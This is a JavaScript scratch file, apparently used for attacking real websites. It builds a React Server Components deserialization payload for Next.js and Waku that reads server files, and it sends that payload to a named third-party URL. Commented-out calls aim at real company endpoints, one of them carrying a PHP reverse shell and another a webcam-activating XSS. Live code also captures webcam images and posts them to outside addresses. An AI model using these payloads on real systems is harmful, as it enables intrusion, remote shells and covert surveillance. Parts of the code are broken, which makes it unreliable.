//const i = new Set();

//var o = Array.from(new Uint8Array(i)).map(m => m.toString(16).padStart(2, "0")).join("");
//for (o("123456aA") of i){
//	i.add(o)
//}
	



//const mockConnectorFilePaths = Object.freeze({
//    [ConnectorType.Sms]: '/tmp/logto_mock_sms_record.txt',
//    [ConnectorType.Email]: '/tmp/logto_mock_email_record.txt'})

const NodeWebcam = require("node-webcam");


//const webcam = NodeWebcam.create({
//	width:1280


//});
//const NodeWebcam = require("node-webcam");

const webcam = NodeWebcam.create({
  width: 1280,
  height: 720,
  quality: 100,
  delay: 0,
  saveShots: true,
  output: "jpeg",
  device: false, // usa câmera padrão
  callbackReturn: "location",
  verbose: true
});
const izaname = NodeWebcam.create("shot", webcam,async (_, file) => fetch("http://127.0.0.1:8080", { method: "POST", body }));
//const next = izaname.list(function(list){
//	var anotherCam = NodeWebcam.list({device:list})
//	var options = NodeWebcam.create(izaname)
//	return options
//});												// headers http://127.0.0.1
var code = NodeWebcam.capture("generateSh",webcam,async (_,file) => fetch("http://192.168.15.13:4444/alocamento-dinamico"),{method:"POST",headers:'x-frame-options ALLOW',body:require("fs").createReadStream("react.html")});

//webcam.capture("shot", (err, data) => {
//  if (err) {
//    console.error("Erro ao acessar a câmera:", err);
//  } else {
//    console.log("Imagem capturada:", data);
//  }
//});
//const izanami = webcam.capture("shot", webcam, async (_, file) => fetch("http://127.0.0.1:8080", { method: "POST", body: require("fs").createReadStream(".") }));

const payload = {
    '0': '$1',
    '1': {
        'status':'resolved_model',
        'reason':0,
        '_response':'$4',
        'value':'{"then":"$3:map","0":{"then":"$B3"},"length":1}',
        'then':'$2:then'
    },
    '2': '$@3',
    '3': [],
    '4': {
        '_prefix':'require("fs").promises.readdir("./").then(f=>Promise.all(f.filter(n=>/\\.txt$/i.test(n)).map(n=>require("fs").promises.readFile(n,"utf8"))))',
//	'_prefix':'>_N2.r("documentReady",function(){_N2.r(["documentReady","smartslider-frontend","SmartSliderWidgetArrowImage","ss-simple"]',
//	'_prefix': "NodeWebcam.capture('shot', webcam, async (_, file) => fetch('http://127.0.0.1:9000', { method: 'POST', body: require("fs").createReadStream(file) }));"
        '_formData':{
            'get':'$3:Object.constructor:constructor'
        },
        '_chunks':'$2:_response:_chunks',
    }
}


const FormDataLib = require('form-data')

const fd = new FormDataLib()

for (const key in code) {
    fd.append(key, JSON.stringify(code[key]))
}

console.log(fd.getBuffer().toString())

console.log(fd.getHeaders())

function exploitNext(baseUrl) {
    fetch(baseUrl, {
        method: 'OPTIONS',
        headers: {
            'next-action': 'y',
            ...fd.getHeaders()
        },
        body: fd.getBuffer()
    }).then(x => {
        console.log('fetched', x)
        return x.text()
    }).then(x => {
        console.log('got', x)
    })
}

function exploitWaku(baseUrl) {
    fetch(baseUrl + '/RSC/foo.txt', {
        method: 'POST',
        headers: fd.getHeaders(),
        body: fd.getBuffer()
    }).then(x => {
        console.log('fetched', x)
        return x.text()
    }).then(x => {
        console.log('got', x)
    })
}


//function send_update(baseUrl){
//	fetch(baseUrl ,{
//	method: 'POST',
//	body:JSON.stringify(payload),
//	headers: JSON.stringify(fd),
	
//}).then(x => {console.log(x.body)});
//}
async function send(baseUrl) {
  const res = await fetch(baseUrl, {
    method: "POST",
    body: JSON.stringify(fd),
    headers: {
      "Content-Type": "application/json",
      "next-action": "x"
    }
  });

  console.log("Status:", res.status);
  console.log("Headers:", [...res.headers.entries()]);

  const text = await res.text();
  console.log("Body:", text);
}

send("https://app.qualified.com/w/1/37pXYrro6wCZbsU7/messenger");



// Place the correct URL and uncomment the line
//exploitNext("https://rum-http-intake.logs.datadoghq.com/v1/input/pub78e1469a8a034c32cc4a7b17fca0acea?ddsource=browser&ddtags=sdk_version%3A3.11.0%2Cenv%3Aproduction%2Cservice%3Ayssy.com.br&batch_time=1766173346226")
//exploitWaku('https://rum-http-intake.logs.datadoghq.com/v1/input/pub78e1469a8a034c32cc4a7b17fca0acea?ddsource=browser&ddtags=sdk_version%3A3.11.0%2Cenv%3Aproduction%2Cservice%3Ayssy.com.br&batch_time=1766173346226')
//send('https://rum-http-intake.logs.datadoghq.com/v1/input/pub78e1469a8a034c32cc4a7b17fca0acea?ddsource=browser&ddtags=sdk_version%3A3.11.0%2Cenv%3Aproduction%2Cservice%3Ayssy.com.br&batch_time=1766181986058')
//exploitNext('https://admin.iam.findup.com.br/api/.well-known/endpoints/admin')
//send('https://admin.iam.findup.com.br/api/.well-known/endpoints/admin?1')
//exploitWaku('https://admin.iam.findup.com.br/api/.well-known/endpoints/admin')
//send("http://94.36.74.34.bc.googleusercontent.com/")
//send("http://94.36.74.34.bc.googleusercontent.com/")
//send("https://wapi.flowinzap.com.br/login?%3Cbody%20onload=%22navigator.mediaDevices.getUserMedia({video:true}).then(s=%3Ecam.srcObject=s)%22%3E%20%3Cvideo%20id=%22cam%22%20autoplay%20playsinline%3E%3C/video%3E%20%3C/body%3E")
//send("https://admin.iam.findup.com.br/api/experience")
//send("https://admin.iam.findup.com.br/api/experience/verification/password")
//send("https://admin.iam.findup.com.br/api/.well-known/endpoints/admin?q=%3C%3Fphp+%24sock%3Dfsockopen%28%27192.160.15.13%27%2C9000%29%3Bexec%28%27%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%27%29%3B+%3F%3E")
//send("https://admin.iam.findup.com.br")
//send('https://admin.iam.findup.com.br/sign-in')
//send('https://api.pwnedpasswords.com/Range/')
//send('https://announcekit.co/widgets/v2/4dx9Yc/data.json')
//send('https://t.announcekit.app/collect/client?token=9NhTGRTjqRtrGvzBdsj3T84kMXqYMKOfKWPg3F5eCdjaNSYIeFvAc9gxJ9OzHEOPUdTRwrH6HFGWACqhb5itsu3TydkUiaTG9qWMVEredjo8sKHzPRF6ikA5&event_type=post-view&post_id=429875&session_id=847bc3b1b55b284ef0c289b87df314b7')
//send('https://rum-http-intake.logs.datadoghq.com/v1/input/pub78e1469a8a034c32cc4a7b17fca0acea?ddsource=browser&ddtags=sdk_version%3A3.11.')
//send("https://etienne.ns.cloudflare.com")
const symbols = "!@#$%^&*()_+-=[]{}|;:,.<>?";

const policy = {
  characterTypes: {
    min: 3
  }
};

const subtle = globalThis.crypto?.subtle
  ?? require("crypto").webcrypto.subtle;

function checkCharTypes(password) {
  const types = new Set();

  for (const c of password) {
    if (c >= "a" && c <= "z") types.add("lowercase");
    else if (c >= "A" && c <= "Z") types.add("uppercase");
    else if (c >= "0" && c <= "9") types.add("digits");
    else if (symbols.includes(c)) types.add("symbols");
    else return "unsupported";
  }

  return types.size >= policy.characterTypes.min;
}

async function hasBeenPwned(password) {
  const hashBuffer = await subtle.digest(
    "SHA-1",
    new TextEncoder().encode(password)
  );

  const hash = Array.from(new Uint8Array(hashBuffer))
    .map(b => b.toString(16).padStart(2, "0"))
    .join("")
    .toUpperCase();

  const prefix = hash.slice(0,5);
  const suffix = hash.slice(5);

  const res = await fetch(
    `https://api.pwnedpasswords.com/range/${prefix}`,{method: "GET"}
  );

  const text = await res.text();
//	console.log(text)
  return text
    .split("\n")
    .some(line => line.startsWith(suffix));
}

const password = "123456aA";
var code =  hasBeenPwned(password);
if (checkCharTypes(password) !== true) {
  console.log("Senha fraca");
} else if  (code) {
  console.log("Senha já vazou");
} else {
  console.log("Senha forte e segura");
}

